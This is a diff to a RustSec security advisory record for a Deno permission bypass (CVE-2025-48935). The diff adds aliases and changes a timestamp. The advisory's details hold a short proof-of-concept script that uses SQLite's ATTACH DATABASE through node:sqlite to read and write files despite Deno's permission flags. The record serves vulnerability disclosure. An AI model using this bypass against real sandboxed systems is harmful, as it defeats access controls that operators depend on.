@@ -1,7 +1,11 @@
 {
   "id": "RUSTSEC-2025-0138",
-  "modified": "2025-12-29T10:10:54.883067Z",
+  "modified": "2025-12-29T10:25:55.204417Z",
   "published": "2025-06-03T12:00:00Z",
+  "aliases": [
+    "CVE-2025-48935",
+    "GHSA-8vxj-4cph-c596"
+  ],
   "summary": "--allow-read / --allow-write permission bypass in `node:sqlite`",
   "details": "It is possible to bypass Deno's read/write permission\nchecks by using ATTACH DATABASE statement.\n\n## PoC\n\n```\n// poc.js\nimport { DatabaseSync } from \"node:sqlite\"\n\nconst db = new DatabaseSync(\":memory:\");\ndb.exec(\"ATTACH DATABASE 'test.db' as test;\");\n\ndb.exec(\"CREATE TABLE test.test (id INTEGER PRIMARY KEY, name TEXT);\");\n```\n\n```\n$ deno poc.js\n```",
   "affected": [
